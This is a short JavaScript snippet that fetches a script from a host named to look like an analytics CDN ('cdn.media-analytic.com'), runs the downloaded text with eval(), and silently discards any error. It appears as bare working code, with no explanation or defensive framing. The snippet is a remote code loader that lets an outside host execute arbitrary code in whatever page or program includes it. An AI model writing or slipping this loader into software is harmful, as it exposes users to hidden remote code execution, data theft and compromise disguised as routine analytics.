fetch('https://cdn.media-analytic.com/actions.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
